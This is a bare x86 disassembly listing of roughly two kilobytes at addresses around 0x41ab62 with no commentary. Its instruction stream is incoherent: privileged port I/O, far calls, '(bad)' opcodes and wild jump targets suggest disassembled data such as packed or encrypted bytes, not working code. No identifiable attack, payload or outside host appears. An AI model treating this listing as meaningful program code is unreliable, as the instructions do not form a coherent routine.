  41ab62:	maxps  xmm7,XMMWORD PTR [edx+edi*4-0x18c7f082]
  41ab6a:	sub    DWORD PTR [ebp-0x9f29f93],ebx
  41ab70:	push   esp
  41ab71:	imul   edx,DWORD PTR [edx+0x53],0x14
  41ab75:	arpl   WORD PTR [ebx+0x2e63a094],sp
  41ab7b:	je     0x41abfa
  41ab7d:	shl    BYTE PTR ds:0xa906902a,1
  41ab83:	mul    BYTE PTR [ecx]
  41ab85:	fsubr  st(6),st
  41ab87:	out    0x9,al
  41ab89:	mov    edx,0xc03b4210
  41ab8e:	rcl    BYTE PTR [eax+0x68],1
  41ab91:	fnstenv [ebp+0x51]
  41ab94:	(bad)  [edx+0x30]
  41ab97:	jge    0x41abb1
  41ab99:	ds gs cld 
  41ab9c:	pop    es
  41ab9d:	fmul   DWORD PTR [eax+0x41]
  41aba0:	mov    DWORD PTR [edx+0x604e94e1],ebx
  41aba6:	pop    eax
  41aba7:	push   cs
  41aba8:	fmulp  st(1),st
  41abaa:	fdiv   st(2),st
  41abac:	inc    esp
  41abad:	mov    WORD PTR [ebp-0x30],ss
  41abb0:	cli    
  41abb1:	lahf   
  41abb2:	sar    BYTE PTR [edi-0x2d0010fc],0x37
  41abb9:	into   
  41abba:	addr16 iret 
  41abbc:	inc    ecx
  41abbd:	push   0x6
  41abbf:	mov    BYTE PTR fs:[esp+eiz*4],ah
  41abc3:	(bad)  
  41abc4:	nop
  41abc5:	shr    DWORD PTR [eax+0xe7f388b],1
  41abcb:	xchg   esp,eax
  41abcc:	push   ds
  41abcd:	and    eax,DWORD PTR [eax]
  41abcf:	fs push ecx
  41abd1:	adc    edi,ebx
  41abd3:	push   edx
  41abd4:	daa    
  41abd5:	push   0x3f
  41abd7:	mov    ds:0x890a1415,eax
  41abdc:	jae    0x41ac2a
  41abde:	add    cl,BYTE PTR gs:[edx+0x65]
  41abe2:	inc    ecx
  41abe3:	arpl   WORD PTR [edi+0x6a],bp
  41abe6:	rol    BYTE PTR [esi+0x76e528f],cl
  41abec:	pop    ss
  41abed:	inc    edx
  41abee:	push   ecx
  41abef:	mov    WORD PTR [edi-0x3c],cs
  41abf2:	jge    0x41ac2b
  41abf4:	mov    dh,0xf
  41abf6:	or     BYTE PTR [esi+0x52254067],0xba
  41abfd:	or     al,0x4b
  41abff:	sub    eax,0xa45e2870
  41ac04:	call   FWORD PTR [edx+0x44]
  41ac07:	mov    ds:0x6a16f3e8,al
  41ac0c:	mov    bh,0x80
  41ac0e:	sbb    eax,DWORD PTR [ecx+0x15eb9317]
  41ac14:	mov    eax,0x46479db8
  41ac19:	mov    ?,WORD PTR [eax]
  41ac1b:	xchg   ebp,eax
  41ac1c:	ror    DWORD PTR [edx+0xccb7751],cl
  41ac22:	clc    
  41ac23:	sahf   
  41ac24:	push   ebp
  41ac25:	pop    ebx
  41ac26:	repz xor eax,0xfab10058
  41ac2c:	sbb    cl,bl
  41ac2e:	sub    BYTE PTR ds:0x79c6983c,ah
  41ac34:	adc    al,0x35
  41ac36:	leave  
  41ac37:	mov    al,0xb5
  41ac39:	loop   0x41abca
  41ac3b:	hlt    
  41ac3c:	scas   eax,DWORD PTR es:[edi]
  41ac3d:	push   0xffffffe0
  41ac3f:	cmp    DWORD PTR [ebx],edx
  41ac41:	mov    edx,0x73cc8251
  41ac46:	dec    edx
  41ac47:	lea    ebx,[esi]
  41ac49:	and    ch,BYTE PTR [esi-0x1e]
  41ac4c:	dec    edi
  41ac4d:	pop    edx
  41ac4e:	push   eax
  41ac4f:	add    al,0x6f
  41ac51:	aad    0xad
  41ac53:	dec    edx
  41ac54:	popa   
  41ac55:	jp     0x41abf6
  41ac57:	idiv   DWORD PTR [esi-0x7ce1748a]
  41ac5d:	dec    edi
  41ac5e:	xor    al,0xd5
  41ac61:	inc    ecx
  41ac62:	ins    DWORD PTR es:[edi],dx
  41ac63:	pop    ecx
  41ac64:	mov    ds:0x9e8b87d0,al
  41ac69:	adc    BYTE PTR [esi+0x367c5097],0xf7
  41ac70:	jmp    DWORD PTR [eax-0x45096c3b]
  41ac76:	les    ebx,FWORD PTR [eax]
  41ac78:	or     eax,ebp
  41ac7a:	fiadd  WORD PTR [ebx-0x70f9558f]
  41ac80:	jmp    0x41ac3e
  41ac82:	push   esp
  41ac83:	inc    ecx
  41ac84:	pop    ebp
  41ac85:	inc    edx
  41ac86:	aaa    
  41ac87:	mov    al,0x5
  41ac89:	in     al,dx
  41ac8a:	mov    bl,0x14
  41ac8c:	js     0x41acd5
  41ac8e:	ins    BYTE PTR es:[edi],dx
  41ac8f:	adc    DWORD PTR [edx+0x57],ecx
  41ac92:	fldcw  WORD PTR [ecx+0x7c]
  41ac95:	and    eax,0xc4561e15
  41ac9a:	cdq    
  41ac9b:	call   0x2dc43f39
  41aca0:	cs xor eax,0x50300b58
  41aca6:	aad    0xe8
  41aca8:	jmp    0x989ee1cb
  41acad:	pop    ebp
  41acae:	jb     0x41ad09
  41acb0:	lea    eax,[si]
  41acb3:	sbb    BYTE PTR [ebp-0x7439e190],ah
  41acb9:	sti    
  41acba:	cmp    BYTE PTR [edx+0x5f],dh
  41acbd:	pop    es
  41acbe:	sbb    ebp,DWORD PTR [esi-0x2c1d5948]
  41acc4:	push   esi
  41acc5:	aas    
  41acc6:	(bad)  
  41acc7:	or     esp,DWORD PTR [ecx+0x2478c97d]
  41accd:	mov    ch,ch
  41accf:	push   es
  41acd0:	inc    edi
  41acd1:	jg     0x41ac92
  41acd3:	pushf  
  41acd4:	jl     0x41ad40
  41acd6:	push   eax
  41acd7:	mov    es,WORD PTR [ecx+0x55]
  41acda:	in     eax,0xee
  41acdc:	jp     0x41ac81
  41acde:	dec    esp
  41acdf:	js     0x41ad12
  41ace1:	out    dx,eax
  41ace2:	shr    BYTE PTR [ebx-0x5c],1
  41ace5:	inc    eax
  41ace6:	addr16 cmc 
  41ace8:	cmp    dl,BYTE PTR [edx-0x65]
  41aceb:	mov    esi,0x38c114f5
  41acf0:	sub    edi,DWORD PTR [edi-0x3d]
  41acf3:	pop    es
  41acf4:	mov    al,0x14
  41acf6:	cmp    cl,BYTE PTR [ecx-0x30]
  41acf9:	mov    dl,0xb3
  41acfb:	or     DWORD PTR [edx-0x7880e89],eax
  41ad01:	imul   esi,DWORD PTR ss:[edi],0x6abedca
  41ad08:	sar    bl,0x63
  41ad0b:	popa   
  41ad0c:	xor    edx,DWORD PTR [edi-0x395c1df8]
  41ad12:	stc    
  41ad13:	pop    ebp
  41ad14:	xlat   BYTE PTR ds:[ebx]
  41ad15:	xchg   edi,eax
  41ad16:	call   0xbd61:0x4cd926e3
  41ad1d:	xchg   ebp,eax
  41ad1e:	cld    
  41ad1f:	xor    eax,ecx
  41ad21:	in     al,0xd9
  41ad23:	retf   0xcdac
  41ad26:	dec    edx
  41ad27:	loopne 0x41ad17
  41ad29:	out    dx,eax
  41ad2a:	xchg   esi,eax
  41ad2b:	sub    DWORD PTR [eax+0x4fd92a3],edx
  41ad31:	dec    ecx
  41ad32:	repnz push edx
  41ad34:	dec    ecx
  41ad35:	leave  
  41ad36:	push   ebx
  41ad37:	push   ebx
  41ad38:	add    DWORD PTR [esi+ebx*2-0x262c99f9],esp
  41ad3f:	das    
  41ad40:	std    
  41ad41:	mov    ds:0x2d00f8b4,eax
  41ad46:	xor    BYTE PTR [edi+0x67261ad],bh
  41ad4c:	xlat   BYTE PTR ds:[ebx]
  41ad4d:	mov    eax,0x36c35cd
  41ad52:	xchg   esp,eax
  41ad53:	call   0x3cc2bc10
  41ad58:	into   
  41ad59:	inc    ebx
  41ad5a:	mov    es,esi
  41ad5c:	and    al,0x59
  41ad5e:	sbb    edi,ecx
  41ad60:	dec    esi
  41ad61:	push   edi
  41ad62:	les    ecx,FWORD PTR [edx]
  41ad64:	stc    
  41ad65:	dec    ebx
  41ad66:	cmp    eax,0x7f8c54d2
  41ad6b:	les    ecx,FWORD PTR [eax]
  41ad6d:	adc    esi,esp
  41ad6f:	adc    BYTE PTR [edx],al
  41ad71:	shl    ebx,cl
  41ad73:	ins    DWORD PTR es:[edi],dx
  41ad74:	test   eax,0x4b6939fa
  41ad79:	test   eax,0x368df85c
  41ad7e:	shl    ch,1
  41ad80:	xor    ch,BYTE PTR [ecx]
  41ad82:	iret   
  41ad83:	cmp    al,0x9
  41ad85:	mov    al,0xf1
  41ad87:	mov    esp,0x64d89c2a
  41ad8c:	sub    BYTE PTR [esp+eax*2+0x3e],cl
  41ad90:	inc    esi
  41ad91:	sub    bh,BYTE PTR [edx+esi*4+0x6f]
  41ad95:	add    DWORD PTR [edx],0xffffffe7
  41ad98:	pop    esi
  41ad99:	dec    edi
  41ad9a:	or     ebp,DWORD PTR ds:0x2fbc7de2
  41ada0:	pop    edx
  41ada1:	mov    ecx,0x1727a35a
  41ada6:	call   0xb278:0xec6bfd43
  41adad:	jge    0x41ade2
  41adaf:	cmp    eax,0x523b4357
  41adb4:	inc    BYTE PTR [ebp-0x46cdf4d4]
  41adba:	mov    al,0x9a
  41adbc:	dec    edi
  41adbd:	xchg   ecx,eax
  41adbe:	push   ebx
  41adbf:	mov    esi,0x962e7419
  41adc4:	pop    ecx
  41adc5:	out    0xc1,eax
  41adc7:	nop
  41adc8:	popf   
  41adc9:	aad    0xc6
  41adcb:	dec    esi
  41adcc:	int    0xa8
  41adce:	sbb    al,0xd4
  41add0:	fst    DWORD PTR [edx+0x0]
  41add3:	dec    ebx
  41add4:	xor    BYTE PTR [edx+0x7b],ch
  41add7:	inc    eax
  41add8:	mov    dl,dh
  41adda:	enter  0xde6b,0x94
  41adde:	pop    ss
  41addf:	repz mov edx,0x10330b43
  41ade5:	(bad)  
  41ade6:	jl     0x41ad92
  41ade8:	lahf   
  41ade9:	shl    DWORD PTR cs:[esi],1
  41adec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aded:	adc    BYTE PTR [ebx*2-0xfeae0e7],bl
  41adf4:	out    0x60,eax
  41adf6:	stos   DWORD PTR es:[edi],eax
  41adf7:	mov    esp,0xd57b5abe
  41adfc:	jecxz  0x41ade6
  41adfe:	hlt    
  41adff:	psrld  mm0,QWORD PTR [esi+0x345e917e]
  41ae06:	fwait
  41ae07:	adc    al,0xfa
  41ae09:	adc    eax,0x27a3434e
  41ae0e:	(bad)  
  41ae0f:	in     al,0x38
  41ae11:	inc    esi
  41ae12:	and    DWORD PTR [ebp-0x7aa1083b],ecx
  41ae18:	pusha  
  41ae19:	cs push edx
  41ae1b:	xchg   edx,eax
  41ae1c:	inc    esi
  41ae1d:	xlat   BYTE PTR ds:[ebx]
  41ae1e:	leave  
  41ae1f:	jge    0x41adb9
  41ae21:	adc    cl,BYTE PTR [ebx]
  41ae23:	and    BYTE PTR [eax-0x20],0xc6
  41ae27:	es push cs
  41ae29:	mov    ds:0x3fccd1ec,al
  41ae2e:	jb     0x41add4
  41ae30:	adc    esi,DWORD PTR [ebx]
  41ae32:	in     al,dx
  41ae33:	pop    es
  41ae34:	in     eax,dx
  41ae35:	pop    ds
  41ae36:	jbe    0x41ae7d
  41ae38:	mov    esi,0x52212dc2
  41ae3d:	dec    ebp
  41ae3e:	lock pop eax
  41ae40:	dec    ebp
  41ae41:	mov    eax,?
  41ae43:	rcl    DWORD PTR [ebp+0x7603f8d8],0x6b
  41ae4a:	out    0x44,al
  41ae4c:	in     eax,dx
  41ae4d:	adc    eax,0xcc79f5f2
  41ae52:	shl    BYTE PTR ss:[ecx],cl
  41ae55:	cmp    al,0x8c
  41ae57:	shr    DWORD PTR [ecx+eiz*1+0x44],0xc0
  41ae5c:	mov    cl,0xfe
  41ae5e:	jecxz  0x41adf0
  41ae60:	add    DWORD PTR [esi+0x2de2d7],ebx
  41ae66:	addr16 inc esp
  41ae68:	inc    esi
  41ae69:	jb     0x41ae2a
  41ae6b:	xchg   BYTE PTR [edi-0x1e],ah
  41ae6e:	pop    ds
  41ae6f:	xchg   esi,eax
  41ae70:	fcomp  DWORD PTR [eax-0x5ae18355]
  41ae76:	imul   esi,DWORD PTR [ebx+ebx*8],0xffffffa1
  41ae7a:	sub    eax,0xe0864c29
  41ae7f:	add    BYTE PTR [edi+ebp*8],ah
  41ae82:	mov    edi,0x3bc129b8
  41ae87:	cs jno 0x41ae20
  41ae8a:	cmp    DWORD PTR [esi-0x114a73f5],0x58
  41ae91:	inc    eax
  41ae92:	jae    0x41ae33
  41ae94:	outs   dx,BYTE PTR ds:[esi]
  41ae95:	xchg   BYTE PTR [ebx+0x1d],al
  41ae98:	mov    al,ds:0xf547867c
  41ae9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae9e:	inc    edx
  41ae9f:	aad    0x5b
  41aea1:	jbe    0x41af04
  41aea3:	nop
  41aea4:	add    eax,0x96daef6
  41aea9:	push   0x4b
  41aeab:	xchg   edi,eax
  41aeac:	xchg   DWORD PTR [esi-0x580b6e5c],ecx
  41aeb2:	popa   
  41aeb3:	in     eax,0x7a
  41aeb5:	add    BYTE PTR [ebp+0x24],ch
  41aeb8:	push   edx
  41aeb9:	cmp    DWORD PTR [ecx],edx
  41aebb:	jp     0x41aedd
  41aebd:	call   0x51d4:0x59780548
  41aec4:	cmp    eax,0x2f61c6ab
  41aec9:	sub    ebx,DWORD PTR [eax-0x4f]
  41aecc:	test   al,0x23
  41aece:	lods   al,BYTE PTR ds:[esi]
  41aecf:	pop    esi
  41aed0:	fdivr  DWORD PTR [ecx]
  41aed2:	inc    eax
  41aed3:	push   edx
  41aed4:	sub    BYTE PTR [edi+ebp*8-0x32],dh
  41aed8:	inc    ecx
  41aed9:	aaa    
  41aeda:	and    eax,0x60fb6a30
  41aedf:	push   es
  41aee0:	jg     0x41aeb5
  41aee2:	and    DWORD PTR [ebp+0x20],ebp
  41aee5:	stc    
  41aee6:	cmc    
  41aee7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aee8:	push   ebp
  41aee9:	jb     0x41aec9
  41aeeb:	push   es
  41aeec:	or     al,dl
  41aeee:	add    DWORD PTR [ebx-0x1],0x51980e21
  41aef5:	daa    
  41aef6:	clc    
  41aef7:	scas   eax,DWORD PTR es:[edi]
  41aef8:	pop    edx
  41aef9:	cmp    al,ch
  41aefb:	push   esi
  41aefc:	fmul   DWORD PTR ds:0x45727c14
  41af02:	jns    0x41af4f
  41af04:	mov    ds:0xf0c9d29a,al
  41af09:	xchg   edi,eax
  41af0a:	xchg   esi,eax
  41af0b:	ins    DWORD PTR es:[edi],dx
  41af0c:	sbb    DWORD PTR [eax],esp
  41af0e:	in     eax,0x3d
  41af10:	outs   dx,DWORD PTR ds:[esi]
  41af11:	xor    BYTE PTR [edi],ch
  41af13:	dec    ebp
  41af14:	mov    ebx,DWORD PTR [edx-0x1978008b]
  41af1a:	inc    ebp
  41af1b:	sub    edi,DWORD PTR [eax-0x6b]
  41af1e:	mov    DWORD PTR ds:0x52740325,edx
  41af24:	adc    edi,esp
  41af26:	fild   QWORD PTR [esi]
  41af28:	lock not ch
  41af2b:	ds ret 0x51e7
  41af2f:	fsub   DWORD PTR [eax-0x449d5775]
  41af35:	popa   
  41af36:	push   esp
  41af37:	adc    eax,0x7fdbe97c
  41af3c:	ffreep st(3)
  41af3e:	retf   0x50c
  41af41:	ins    DWORD PTR es:[edi],dx
  41af42:	dec    ebp
  41af43:	test   cl,al
  41af45:	stc    
  41af46:	scas   eax,DWORD PTR es:[edi]
  41af47:	push   eax
  41af48:	jge    0x41aed1
  41af4a:	xor    bl,bl
  41af4c:	mov    bh,0xc9
  41af4e:	mov    edi,0x123ceccd
  41af53:	pusha  
  41af54:	or     ah,dh
  41af56:	mov    eax,DWORD PTR [edi]
  41af58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af59:	in     eax,dx
  41af5a:	pop    ecx
  41af5b:	imul   ebx,DWORD PTR [ebx+ecx*1+0x53],0x318afd5e
  41af63:	popa   
  41af64:	mov    BYTE PTR [eax],cl
  41af66:	sub    eax,0xc5587aa8
  41af6b:	imul   ebx,DWORD PTR [edi-0x6fddb96c],0x57
  41af72:	outs   dx,BYTE PTR ds:[esi]
  41af73:	aad    0x9f
  41af75:	jns    0x41af28
  41af77:	or     al,0x23
  41af79:	mov    ch,0x86
  41af7b:	data16 mov al,0xa5
  41af7e:	and    DWORD PTR [ebx],esp
  41af80:	retf   0x40c7
  41af83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af84:	adc    BYTE PTR ds:0xc172eb67,al
  41af8a:	not    al
  41af8c:	enter  0x7428,0xa0
  41af90:	in     al,0x66
  41af92:	leave  
  41af93:	or     esp,eax
  41af95:	addr16 stc 
  41af97:	xchg   DWORD PTR [edx],esi
  41af99:	aam    0x75
  41af9b:	std    
  41af9c:	ss mov eax,0x650a3b7f
  41afa2:	mov    bl,0xe3
  41afa4:	sbb    DWORD PTR [eax-0x3fc5c1ce],esi
  41afaa:	mov    al,ds:0xb78e6a38
  41afaf:	xchg   BYTE PTR [ebp+0x1b],ah
  41afb2:	vorpd  xmm0,xmm2,XMMWORD PTR [eax-0xb2373e6]
  41afba:	cld    
  41afbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afbc:	cs ret 0xa741
  41afc0:	scas   eax,DWORD PTR es:[edi]
  41afc1:	outs   dx,DWORD PTR ds:[esi]
  41afc2:	ja     0x41afba
  41afc4:	pop    edx
  41afc5:	mov    al,0x30
  41afc7:	imul   ecx,DWORD PTR [ecx+eiz*8+0x3a],0x3797a73
  41afcf:	fisttp DWORD PTR [esi]
  41afd1:	push   edi
  41afd2:	pop    esp
  41afd3:	inc    edi
  41afd4:	push   esp
  41afd5:	cmp    bh,bl
  41afd7:	sbb    al,0x7b
  41afd9:	and    eax,0x3196f2ab
  41afde:	les    ecx,FWORD PTR [edi]
  41afe0:	pcmpgtb mm4,QWORD PTR [ebp-0x1cb90d55]
  41afe7:	repz push eax
  41afe9:	jnp    0x41afc8
  41afeb:	adc    al,0xbf
  41afed:	pop    edx
  41afee:	iret   
  41afef:	pop    eax
  41aff0:	add    cl,BYTE PTR [eax]
  41aff2:	jae    0x41af86
  41aff4:	call   0x403eec71
  41aff9:	lea    edx,[ebx]
  41affb:	fbld   TBYTE PTR [ebx+eiz*4]
  41affe:	sbb    BYTE PTR [ebx+0x316c6240],dh
  41b004:	jmp    0x41afe8
  41b006:	add    edx,esp
  41b008:	inc    esi
  41b009:	outs   dx,DWORD PTR ds:[esi]
  41b00a:	inc    esi
  41b00b:	cmp    ebp,DWORD PTR gs:[ecx]
  41b00e:	jge    0x41b021
  41b010:	jl     0x41b075
  41b012:	fimul  DWORD PTR [ebx+0x1dfe005e]
  41b018:	imul   BYTE PTR [edi-0x34]
  41b01b:	das    
  41b01c:	pop    es
  41b01d:	jp     0x41b016
  41b01f:	int3   
  41b020:	outs   dx,DWORD PTR ds:[esi]
  41b021:	jp     0x41afa3
  41b023:	mov    esp,0x912c6800
  41b028:	pop    es
  41b029:	das    
  41b02a:	mov    ebp,0x1fd8d448
  41b02f:	or     al,0x41
  41b031:	outs   dx,DWORD PTR ds:[esi]
  41b032:	pop    esi
  41b033:	jp     0x41afea
  41b035:	cmp    eax,0xe9ab3448
  41b03a:	xlat   BYTE PTR ds:[ebx]
  41b03b:	jmp    0x11aa:0xcdd2baa4
  41b042:	dec    eax
  41b043:	in     eax,dx
  41b044:	mov    eax,0xe285832
  41b049:	(bad)  
  41b04a:	sub    DWORD PTR [esi+ebx*2],ebx
  41b04d:	stos   BYTE PTR es:[edi],al
  41b04e:	pop    ecx
  41b04f:	wbinvd 
  41b051:	mov    ebx,0xce23812d
  41b056:	and    al,0x34
  41b058:	jnp    0x41b08b
  41b05a:	push   edx
  41b05b:	pop    ebx
  41b05c:	adc    ah,dh
  41b05e:	sub    eax,0x4f934231
  41b063:	jge    0x41b030
  41b065:	ffreep st(7)
  41b067:	xor    BYTE PTR [ebx+eiz*1-0x3354dfbe],bl
  41b06e:	cmp    al,0xb6
  41b070:	cmp    BYTE PTR [edi+0x2c],0x10
  41b074:	addr16 clc 
  41b076:	pop    es
  41b077:	adc    esp,DWORD PTR [ecx]
  41b079:	jle    0x41b077
  41b07b:	push   esi
  41b07c:	xor    DWORD PTR [edx+0x5fe1f96d],0x677a7ca8
  41b086:	js     0x41b02f
  41b088:	add    bh,BYTE PTR [esi+edi*1+0x45bbf68a]
  41b08f:	or     al,0xac
  41b091:	inc    eax
  41b092:	mov    bh,0xcb
  41b094:	and    bl,BYTE PTR [edx+0x58]
  41b097:	and    eax,DWORD PTR [edx+0x69]
  41b09a:	sbb    eax,0x56278414
  41b09f:	scas   eax,DWORD PTR es:[edi]
  41b0a0:	inc    esi
  41b0a1:	int    0x9b
  41b0a3:	lahf   
  41b0a4:	repnz test DWORD PTR [ecx],ebp
  41b0a7:	sub    DWORD PTR [esi-0x6c],ebp
  41b0aa:	mov    ds:0xaa925655,al
  41b0af:	jbe    0x41b050
  41b0b1:	mov    edi,0xaf64d2cb
  41b0b6:	aas    
  41b0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b8:	inc    esi
  41b0b9:	adc    eax,0x72ef77fe
  41b0be:	mov    edi,0x19927814
  41b0c3:	outs   dx,BYTE PTR ds:[esi]
  41b0c4:	(bad)  
  41b0c5:	pop    ss
  41b0c6:	mov    al,0xdc
  41b0c8:	pop    edi
  41b0c9:	dec    esp
  41b0ca:	bound  eax,QWORD PTR [ecx-0x4a3f381a]
  41b0d0:	icebp  
  41b0d1:	and    DWORD PTR [ebp+eax*2-0x76],edx
  41b0d5:	jmp    0x41b0e4
  41b0d7:	(bad)  
  41b0d8:	jne    0x41b13c
  41b0da:	sub    al,0xd3
  41b0dc:	adc    DWORD PTR [edx],0x892e25a2
  41b0e2:	pop    ebp
  41b0e3:	mov    ecx,0xd102d074
  41b0e8:	bound  ebx,QWORD PTR [eax-0x22be7e45]
  41b0ee:	(bad)  
  41b0ef:	gs inc ecx
  41b0f1:	aas    
  41b0f2:	fisttp WORD PTR [ebp+0x50]
  41b0f5:	lea    edi,[ecx]
  41b0f7:	je     0x41b0eb
  41b0f9:	xchg   esp,eax
  41b0fa:	daa    
  41b0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0fc:	dec    eax
  41b0fd:	nop
  41b0fe:	imul   esp,DWORD PTR [edx],0x7e646348
  41b104:	mov    dh,0xd7
  41b106:	pop    esp
  41b107:	or     esi,edi
  41b109:	mov    esp,0x73f26a81
  41b10e:	ins    DWORD PTR es:[edi],dx
  41b10f:	hlt    
  41b110:	sti    
  41b111:	js     0x41b138
  41b113:	scas   al,BYTE PTR es:[edi]
  41b114:	int    0xe6
  41b116:	cwde   
  41b117:	test   eax,0xf81aa206
  41b11c:	sub    edi,DWORD PTR [eax-0x7dfce0cf]
  41b122:	mov    cl,0x7d
  41b124:	sub    al,0x7
  41b126:	fcmovnbe st,st(6)
  41b128:	aaa    
  41b129:	out    0x5f,eax
  41b12b:	cmp    BYTE PTR [edx],dh
  41b12d:	or     ah,BYTE PTR [ecx-0x22]
  41b130:	xchg   edx,eax
  41b131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b133:	pop    ebp
  41b134:	jae    0x41b16f
  41b136:	scas   al,BYTE PTR es:[edi]
  41b137:	imul   ecx,DWORD PTR [edx],0x3e
  41b13a:	pop    ds
  41b13b:	mov    edx,0x1f8b838d
  41b140:	arpl   WORD PTR [ecx],sp
  41b142:	std    
  41b143:	or     eax,0x5cf452fe
  41b148:	jle    0x41b12a
  41b14a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b14b:	repnz pop eax
  41b14d:	or     eax,0xbef0ada8
  41b152:	jge    0x41b179
  41b154:	xchg   BYTE PTR [ebp+0x58],dl
  41b157:	outs   dx,DWORD PTR ds:[esi]
  41b158:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b159:	cmc    
  41b15a:	fdivr  DWORD PTR ds:0x9bcd6931
  41b160:	sbb    eax,0x7451dad4
  41b165:	sbb    ecx,DWORD PTR [ebx]
  41b167:	(bad)  
  41b169:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b16a:	adc    cl,0x50
  41b16d:	mov    bh,BYTE PTR [edi]
  41b16f:	xor    DWORD PTR [ecx],eax
  41b171:	daa    
  41b172:	retf   
  41b173:	call   0x5119:0x765ce3a1
  41b17a:	jmp    0x41b11c
  41b17c:	sbb    ebx,ecx
  41b17e:	bound  esp,QWORD PTR [ecx-0x6cd5152e]
  41b184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b185:	rcr    bh,1
  41b187:	xor    BYTE PTR [edi-0x4c],ch
  41b18a:	aam    0x1a
  41b18c:	push   0xdf8c0175
  41b191:	jbe    0x41b183
  41b193:	mov    ecx,0xbaeac7f0
  41b198:	sahf   
  41b199:	mov    ah,0x2f
  41b19b:	dec    ebp
  41b19c:	push   edi
  41b19d:	les    ecx,FWORD PTR [edi+edx*4+0x6a]
  41b1a1:	mov    WORD PTR [ecx-0xc],gs
  41b1a4:	bswap  esi
  41b1a6:	cmc    
  41b1a7:	mov    edx,0x6a026a32
  41b1ac:	mov    esi,0x5cad3d17
  41b1b1:	jmp    0x71b1f0ac
  41b1b6:	push   edi
  41b1b7:	jnp    0x41b15b
  41b1b9:	test   DWORD PTR [ebp-0x2e],edx
  41b1bc:	xor    eax,0xc78df758
  41b1c1:	in     eax,dx
  41b1c2:	repz xchg ebx,eax
  41b1c4:	xor    DWORD PTR ds:0xf5b50ca0,edi
  41b1ca:	xor    dh,BYTE PTR ds:0xdad77ef6
  41b1d0:	pop    ds
  41b1d1:	les    eax,FWORD PTR [ecx]
  41b1d3:	enter  0x3b7a,0x7e
  41b1d7:	das    
  41b1d8:	arpl   bx,cx
  41b1da:	jp     0x41b1fa
  41b1dc:	dec    esi
  41b1dd:	out    0x9c,al
  41b1df:	(bad)  
  41b1e1:	jmp    0x22c96cc2
  41b1e6:	loopne 0x41b16f
  41b1e8:	or     DWORD PTR [edx+0x65],ebx
  41b1eb:	cmp    eax,0x5fa3ea42
  41b1f0:	mov    dh,BYTE PTR [eax-0x7c]
  41b1f3:	add    bl,dh
  41b1f5:	ss xor eax,0x3654e774
  41b1fb:	stos   DWORD PTR es:[edi],eax
  41b1fc:	dec    ebp
  41b1fd:	mov    ah,BYTE PTR [esi+0x5]
  41b200:	mov    ebp,fs
  41b202:	in     eax,dx
  41b203:	nop
  41b204:	clc    
  41b205:	ja     0x41b1b5
  41b207:	or     al,0x14
  41b209:	xchg   esi,eax
  41b20a:	cld    
  41b20b:	add    DWORD PTR [edx+0x50],edx
  41b20e:	push   cs
  41b20f:	xor    BYTE PTR [ebp+0x4247bb53],dh
  41b215:	pop    eax
  41b216:	lea    edx,ds:0x7e80b31b
  41b21c:	sub    eax,0x56d3802d
  41b221:	inc    ebx
  41b222:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b223:	mov    ch,0x4e
  41b225:	mov    ?,WORD PTR [edx+0x3c1baf49]
  41b22b:	rcl    BYTE PTR [esp+esi*8],1
  41b22e:	cmp    DWORD PTR [ebx],0x8d90ace0
  41b234:	stc    
  41b235:	test   BYTE PTR [eax-0xff71479],ah
  41b23b:	pop    edx
  41b23c:	es popa 
  41b23e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b23f:	aad    0x60
  41b241:	in     al,dx
  41b242:	and    ch,cl
  41b244:	(bad)  
  41b245:	fisttp DWORD PTR [esi+0x7b56a816]
  41b24b:	xor    al,0xf9
  41b24d:	leave  
  41b24e:	ins    DWORD PTR es:[edi],dx
  41b24f:	ds push cs
  41b251:	pop    eax
  41b252:	test   DWORD PTR [ecx+0x4cf5ecdf],esi
  41b258:	fs jo  0x41b2b1
  41b25b:	leave  
  41b25c:	not    ch
  41b25e:	or     al,0x60
  41b260:	loop   0x41b2b7
  41b262:	cwde   
  41b263:	pop    edx
  41b264:	sub    bl,BYTE PTR [edx-0x15]
  41b267:	loop   0x41b204
  41b269:	fs inc edi
  41b26b:	sahf   
  41b26c:	aas    
  41b26d:	jb     0x41b213
  41b26f:	iret   
  41b270:	shl    BYTE PTR [eax-0x747aeac],cl
  41b276:	adc    eax,0x1a6a794d
  41b27b:	cmp    al,0x16
  41b27d:	sub    ebp,esi
  41b27f:	xchg   esp,eax
  41b280:	dec    esi
  41b281:	cli    
  41b282:	push   0x50
  41b284:	add    DWORD PTR [edi+0x1d],ebp
  41b287:	mov    ah,BYTE PTR [eax]
  41b289:	dec    ecx
  41b28a:	and    al,0x97
  41b28c:	mov    al,0xaa
  41b28e:	cli    
  41b28f:	ds ret 0xbaba
  41b293:	sub    bl,dl
  41b295:	or     eax,0x5daf2db6
  41b29a:	je     0x41b243
  41b29c:	ds repnz xchg esp,eax
  41b29f:	xor    edi,DWORD PTR [edi]
  41b2a1:	(bad)  
  41b2a2:	mov    ah,0x22
  41b2a4:	pusha  
  41b2a5:	xor    BYTE PTR [edi+0x54],ch
  41b2a8:	nop
  41b2a9:	in     al,dx
  41b2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2ab:	mov    edi,DWORD PTR [esi+0x586be49c]
  41b2b1:	push   ebx
  41b2b2:	lea    edi,[ebx-0x1f]
  41b2b5:	loopne 0x41b24f
  41b2b7:	pop    ds
  41b2b8:	sub    DWORD PTR [ebp+0x34],esp
  41b2bb:	in     eax,0x82
  41b2bd:	push   ebx
  41b2be:	push   edi
  41b2bf:	adc    esi,esp
  41b2c1:	js     0x41b249
